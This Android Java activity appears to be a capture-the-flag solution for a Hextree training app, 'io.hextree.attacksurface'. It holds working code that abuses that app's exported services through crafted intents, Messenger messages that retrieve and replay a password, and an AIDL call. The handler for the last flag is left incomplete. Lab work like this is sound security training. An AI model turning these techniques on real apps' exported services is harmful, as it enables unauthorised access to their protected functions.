package com.example.evilcorp;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Messenger;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import android.os.RemoteException;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class ServicesActivity extends AppCompatActivity {



    private static final String TAG = "ServicesActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_services);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });


        //back button code

        Button backBtn = findViewById(R.id.backButtonFromServices);
        backBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(ServicesActivity.this, MainActivity.class);
                startActivity(intent);
            }
        });

//---------------------------------------------------------------------------------------------------------------------------

        // Flag 24 Code
        Button flag24Button = findViewById(R.id.flag24Button);
        flag24Button.setOnClickListener(v -> {
            Intent intent = new Intent("io.hextree.services.START_FLAG24_SERVICE");
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag24Service");
            startService(intent);
        });

//        ================================

        // Flag 25 Code
        Button flag25Button = findViewById(R.id.flag25Button);
        flag25Button.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
                // Notice that the serivce is not an activity, only one running service instance so we can send different actions 1 by 1 to the same instace.
            intent.setAction("io.hextree.services.UNLOCK1");
            startService(intent);

            intent.setAction("io.hextree.services.UNLOCK2");
            startService(intent);

            intent.setAction("io.hextree.services.UNLOCK3");
            startService(intent);

        });

//        ================================

        // Flag 26 Code
        Button flag26Button = findViewById(R.id.flag26Button);
        flag26Button.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service");
            bindService(intent, new ServiceConnection() {
                @Override
                public void onServiceConnected(ComponentName name, IBinder service) {
                    try {
                        new Messenger(service).send(Message.obtain(null, 42));
                    } catch (Exception ignored) {}
                }

                @Override
                public void onServiceDisconnected(ComponentName name) {

                }
            },BIND_AUTO_CREATE);

        });

//        ================================

        // Flag 27 Code
        Button flag27Button = findViewById(R.id.flag27Button);
        flag27Button.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service");


            bindService(intent, new ServiceConnection() {
                @Override
                public void onServiceConnected(ComponentName name, IBinder service) {

                    Messenger serviceMessenger = new Messenger(service);

                    Message msg1 = Message.obtain(null, 1);
                    Bundle b1 = new Bundle();
                    b1.putString("echo", "give flag");
                    msg1.setData(b1);

                    try {
                        serviceMessenger.send(msg1);
                    } catch (RemoteException e) {
                        Log.e("MyApp", "1 Failed to send message to service", e);
                    }


                    Message msg2 = Message.obtain(null, 2);

                    msg2.obj = new Message();

                    msg2.replyTo = new Messenger(new Handler(Looper.getMainLooper()) {
                        @Override
                        public void handleMessage(Message reply) {
                            String password = reply.getData().getString("password");
                            Log.i(TAG, "Password received: " + password);

                            if (password == null) {
                                Toast.makeText(ServicesActivity.this,
                                        "Password returned null!", Toast.LENGTH_SHORT).show();
                                return;
                            }
                            Message msg3 = Message.obtain(null, 3);
                            Bundle b3 = new Bundle();
                            b3.putString("password", password);
                            msg3.setData(b3);

                            msg3.replyTo = new Messenger(new Handler(Looper.getMainLooper()));

                            try {
                                serviceMessenger.send(msg3);
                            } catch (RemoteException e) {
                                Log.e("MyApp", "3 Failed to send message to service", e);
                            }
                        }
                    });
                    try {
                        serviceMessenger.send(msg2);
                    } catch (RemoteException e) {
                        Log.e("MyApp", "2 Failed to send message to service", e);
                    }
                }
                @Override
                public void onServiceDisconnected(ComponentName name) {}
            }, BIND_AUTO_CREATE);

        });

//        ================================

        // Flag 28 Code

        Button flag28Button = findViewById(R.id.flag28Button);
        flag28Button.setOnClickListener(v -> {

            //prepare the intent to call the correct service
            Intent intent = new Intent();
            intent.setClassName("io.hextree.attacksurface",
                    "io.hextree.attacksurface.services.Flag28Service");

            //this is called once we bind to the service and get back a binder service that we can use to communicate
            ServiceConnection mConnection = new ServiceConnection() {
                @Override //
                public void onServiceConnected(ComponentName name, IBinder service) {
                    //we can then use the flag interface generated from the aidl file
                    // we use the Stub.asInterface() to pass in the binder object
                    IFlag28Interface remoteService = IFlag28Interface.Stub.asInterface(service);
                    try {
                        //now all we need to do is call this remote service accessible through the interface defined in the aidl, and call the exposed methods
                        remoteService.openFlag();
                    } catch (RemoteException e) {
                        throw new RuntimeException(e);
                    }
                }

                @Override
                public void onServiceDisconnected(ComponentName name) {

                }
            };
            //use this to bind to the service, we needed to create the above ServiceConnection() method
            bindService(intent, mConnection, Context.BIND_AUTO_CREATE);

        });

//        ================================

        Button flag29Button = findViewById(R.id.flag29Button);
        flag29Button.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag29Service");
        });


    }





}